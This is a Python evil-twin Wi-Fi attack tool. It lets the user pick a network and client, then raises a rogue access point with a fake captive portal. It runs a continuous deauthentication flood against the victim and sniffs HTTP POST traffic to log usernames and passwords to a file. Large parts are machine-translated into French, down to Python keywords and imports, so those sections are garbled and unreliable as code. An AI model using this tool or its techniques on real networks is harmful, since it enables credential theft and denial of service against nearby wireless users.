Signal d’importation 
Importer le système d’exploitation
import pathlib
à partir de threading import Thread
à partir de la saisie de la liste d’importation
importer sys
Heure d’importation
Importation consts
Socket d’importation 
de scapy. All import sniff, sendp
de scapy. couches. http import HTTPRequest, Raw
de scapy. couches. dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth 


def signal_handler(sig, frame):
    print(« \n[+] Vous avez SIGINT, je commence à tout réinitialiser ! »)
    OS. system('rm *.conf')
    OS. system('service NetworkManager restart')
    OS. system('service apache2 stop')
    OS. system('service hostapd stop')
    OS. system(f’airmon-ng stop wlan0')
    OS. system('killall dnsmasq >/dev/null 2>&1')
    OS. system('killall hostapd >/dev/null 2>&1')
    si pathlib. Chemin(consts. file_name_hostapd). exists():
        OS. system(f’rm {consts. file_name_hostapd}')

    si pathlib. Chemin(consts. file_name_dns_masq). exists():
        OS. system(f’rm {consts. file_name_dns_masq}')
    print(« [+] Réussi à réinitialiser! \n[+] Au revoir »)
    sys. exit(0)


signal. signal(signal. SIGINT, signal_handler)


classe Apache2:
    def __init__(self):
        passer

    def move_apache_files(self):
        si pathlib. Chemin('/var/www/html/'). exists():
            OS. system('rm -r /var/www/html/')

        OS. system('cp -r html /var/www/')

    def add_apache_conf(self):
        avec open(consts. file_name_apache_conf, 'r') comme apache_conf:
            si consts. APACHE_CONF en apache_conf. Lire():
                rendre
        avec open(consts. file_name_apache_conf, 'a+') comme apache_conf:
            si 'Répertoire' n’est pas dans apache_conf. Lire():
                apache_conf. write(consts. APACHE_CONF)
                print(« écrire dans le fichier conf »)

    def start(self):
        """
 Cette méthode ajoute le site Web du portail captif frontal à /var/www/html
 et ajouter Apache conf en utilisant les méthodes 'move_apache_files' 'configure_apache2'
        """
        soi-même. move_apache_files()
        soi-même. add_apache_conf()
        OS. system('a2enmod rewrite >/dev/null 2>&1')
        OS. system('service apache2 start')


classe AccessPoint :
    def __init__(self, interface: str, ssid: str, channel: int): 
        soi-même. SSID = SSID
        soi-même.  interface = interface
        soi-même.  canal = canal

    @statiqueméthode
    def reset():
        """
 Cette méthode réinitialise tout aux paramètres d’usine
        """
        OS. system('rm *.conf >/dev/null 2>&1')
        OS. system('service NetworkManager restart')
        OS. system('service apache2 stop')
        OS. system('service hostapd stop')

        OS. system('killall dnsmasq >/dev/null 2>&1')
        OS. system('killall hostapd >/dev/null 2>&1')
        si pathlib. Chemin(consts. file_name_hostapd). exists():
            OS. system(f’rm {consts. file_name_hostapd}')

        si pathlib. Chemin(consts. file_name_dns_masq). exists():
            OS. system(f’rm {consts. file_name_dns_masq}')

    def create_conf_files(self):
        """
 Cette méthode crée dnsmasq.conf et hostapd.conf
 fichiers, ces fichiers sont essentiels pour la réussite de ce processus
        """
        avec open(consts. file_name_dns_masq, 'w+') en tant que dns:
            DNS. write(consts. DNSMASK. format(self. interface))

        avec open(consts. file_name_hostapd, 'w+') en tant que hostapd:
            hostapd. write(consts. HOSTAPD. format(self. interface, soi. SSID, soi. canal))

    def start(self):
        print("[+] Creating fake access point...")
        self.create_conf_files()
        os.system('airmon-ng check kill >/dev/null 2>&1')
        os.system(f'airmon-ng start {self.interface}')
        os.system(f'dnsmasq -C {os.getcwd()}/{consts.file_name_dns_masq}')
        os.system(f'hostapd {consts.file_name_hostapd} -B')
        os.system(f'ifconfig {self.interface} 192.168.1.1/24')
        Apache2().start()
        print("[+] Created fake access point!")


class client:
    """
    this class is responsible to find the identity of the client we want to attack
    """

    def __init__(self, mac: str, channel: int):
        self.mac = mac
        self.channel = channel
        self.interface = None


class AP:
    _id = -1

    def __init__(self, name=None, mac=None, channel=None):
        self.id = AP._id
        self.name = name
        self.mac = mac
        self.channel = channel
        AP._id += 1

    def __repr__(self):
        return f'ID: {self.id} | Name: {self.name} | Mac: {self.mac} | Channel: {self.channel}\n'


class Interfaces:

    def __init__(self):
        self.interfaces = None
        self.channel = None
        self.ap_macs = set()
        self.access_points = []
        self.clients_mac = []
        self.find_all_available_interfaces()
        self.chosen_interface = None
        self.chosen_client = None
        self.chosen_ap = AP()
        self.duplicate: list = []

    def monitor_mode(self):
        print(f"[+] transform {self.chosen_interface} into monitor mode...")
        os.system('airmon-ng check kill >/dev/null 2>&1')
        os.system(f'airmon-ng start {self.chosen_interface} >/dev/null 2>&1')

    def find_all_available_interfaces(self):
        print("[+] looking for all available interfaces...")
        self.interfaces = [iface[1] for iface in socket.if_nameindex()]

    def ap_packet_handler(self, pkt):
        if pkt.haslayer(Dot11Beacon):
            mac = pkt[Dot11].addr2
            if mac in self.ap_macs:
                return
            name = pkt[Dot11Elt].info.decode()
            channel = pkt[Dot11Beacon].network_stats().get("channel")
            self.access_points.append(AP(name, mac, channel))
            self.ap_macs.add(mac)

    def find_all_available_ap_on_specified_interface(self):
        print(f"[+] looking for all availabale access point on {self.chosen_interface}...")
        channel_changer = Thread(target=self.change_channel)
        channel_changer.daemon = True
        channel_changer.start()
        if self.chosen_interface == None:
            return
        sniff(iface=self.chosen_interface, prn=self.ap_packet_handler, timeout=5)

    def change_channel(self):
        channel_switch = 1
        while True:
            os.system('iwconfig %s channel %d' % (self.chosen_interface, channel_switch))
            # switch channel in range [1,14] each 0.5 seconds
            channel_switch = channel_switch % 14 + 1
            time.sleep(0.5)

    def clients_packet_handler(self, packet):
        if (packet.addr2 == self.chosen_ap.mac
            or packet.addr3 == self.chosen_ap.mac)\
                and packet.addr1 != "ff:ff:ff:ff:ff:ff":
            if packet.addr1 not in self.clients_mac:
                if packet.addr2 != packet.addr1 and packet.addr1 != packet.addr3:
                    # Add the new found client to the client list
                    self.clients_mac.append(packet.addr1)

    def find_all_clients_on_specified_network(self):
        print(f"[+] looking for all the connected clients on {self.chosen_ap.name}")
        sniff(iface=self.chosen_interface, prn=self.clients_packet_handler, timeout=20)

    def duplicate_ap_handler(self, packet):
        if packet.haslayer(Dot11Beacon):
            name = packet[Dot11Elt].info.decode()
            if name in self.duplicate:
                self.duplicate.append(packet[Dot11Elt].info.decode())

    def find_duplicate_ap(self):
        print(f"[+] looking for all the duplicate access points on {self.chosen_interface}...")
        channel_changer = Thread(target=self.change_channel)
        channel_changer.daemon = True
        channel_changer.start()
        if self.chosen_interface == None:
            return
        sniff(iface=self.chosen_interface, prn=self.ap_packet_handler, timeout=20)
        print(f'[+] Found {int(len(self.duplicate) / 2)} duplicate access point!')
        if len(self.duplicate) > 0:
            print(f'[+] Here are all the duplicate access point:\n {set(self.duplicate)}')

    def start_defence(self):
        self.find_all_available_interfaces()
        self.chosen_interface = self.interfaces[ui.choose_interface(self.interfaces)]
        self.monitor_mode()
        self.find_duplicate_ap()

    def start(self):
        self.find_all_available_interfaces()
        self.chosen_interface = self.interfaces[ui.choose_interface(self.interfaces)]
        self.monitor_mode()

        self.find_all_available_ap_on_specified_interface()
        self.chosen_ap = self.access_points[ui.choose_ap(self.access_points)]
        print(f'[+] Your choice: {self.chosen_ap}')

        self.find_all_clients_on_specified_network()
        if len(self.clients_mac) ==0:
            user_input = input("[-] Did not found any client,[-] for exit press ctrl + C,\n[-] for Re-scan press any other key")
            self.find_all_clients_on_specified_network()
        self.chosen_client = self.clients_mac[ui.choose_client(self.clients_mac)]
        print(f'[+] Your choice: {self.chosen_client}')


class ui:
    def __init__(self):
        pass

    @staticmethod
    def choose_interface(ifaces: list) -> int:
        print('-' * 50)
        print("[+] Available interfaces: ")
        for i in range(len(ifaces)):
            print(f'ID: {i} | Name: {ifaces[i]}')
        user_input = int(input("[?] Please insert which interface would you like to use for this attack\n"))
        if user_input < 0 or user_input > len(ifaces) - 1:
            print("[-] Wrong input!, try again.")
            ui.choose_interface(ifaces)
        else:
            return user_input

    @staticmethod
    def choose_ap(APs: List[AP]) -> int:
        print('-' * 50)
        print("[+] Available access points: ")
        for ap in APs:
            print(ap)
        print("[?] Please insert the ID of the access point you would like to attack...\n")

        user_input = int(input())
        if user_input < 0 or user_input > len(APs) - 1:
            print("[-] Wrong input!, try again.")
            ui.choose_client(APs)
        else:
            return user_input

    @staticmethod
    def choose_client(clients: list) -> int:

        print('-' * 50)
        print(f'[+] Available clients: ')
        for i in range(len(clients)):
            print(f'ID: {i} | MAC: {clients[i]}')

        user_input = int(input("[?] Please insert which client would you like to attack\n"))

        if user_input < 0 or user_input > len(clients) - 1:
            print("[-] Wrong input!, try again.")
            ui.choose_client(clients)
        else:
            return user_input


def sniff_password(packet):
    if packet.haslayer(HTTPRequest):
        if packet[HTTPRequest].Method.decode() == 'POST' and packet.haslayer(Raw):
            det = str(packet[Raw]).split('&')
            with open("passwords.txt", "a+") as password:
                password.write(f'username: {det[0].split("=")[1]},'
                               f' Password: {det[1].split("=")[1]}')


def deauth_attack(client_mac, ap_mac, iface):
    print(f'{client_mac}, {ap_mac}, {iface}')
    client_11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
    ap_11 = Dot11(addr1=ap_mac, addr2=client_mac, addr3=client_mac)
    client_frame = RadioTap() / client_11 / Dot11Deauth()
    ap_frame = RadioTap() / ap_11 / Dot11Deauth ()
    alors que True :
        sendp(client_frame, iface=iface, inter=0.100, verbose=False) # pour le client
        sendp(ap_frame, iface=iface, inter=0.100, verbose=False) # pour le point d’accès


def défense():
    ifaces = Interfaces()
    ifaces. start_defence()


def attack():
    ifaces = Interfaces()
    ifaces. commencer()
    ap = AccessPoint(ifaces. chosen_interface, ifaces. chosen_ap. nom, ifaces. chosen_ap. canal)
    Point d’accès. réinitialisation()
    AP. commencer()
    print(« [+] début d’attaque\n »)
    deauth_thread = Thread(target=deauth_attack,
                           args=(ifaces. chosen_client, ifaces. chosen_ap. Mac, ifaces. chosen_interface))
    deauth_thread. commencer()
    imprimer(« renifler »)
    sniff(iface=ifaces. chosen_interface, filter='port 80', prn=sniff_password, store=False)


if __name__ == '__main__':
    sinon  pathlib. Chemin('mot de passe.txt'). exists():
        avec open(« password.txt », 'w+') comme p:
            passer
    print(« Bienvenue dans notre outil EvilTwin: »)
    print(« [+] Vous pouvez quitter le programme en toute sécurité en appuyant sur CTRL + C »)
    user_input = input(« [+] Pour une attaque, appuyez sur 0\n[+] Pour la défense, appuyez sur 1\n[+] Pour quitter, appuyez sur n’importe quelle autre touche\n »)
    if user_input == '0':
        attaquer()
    elif user_input == '1':
        défense()
    sinon:
        print(« [+] Au revoir:) »)
        sys. exit(1)
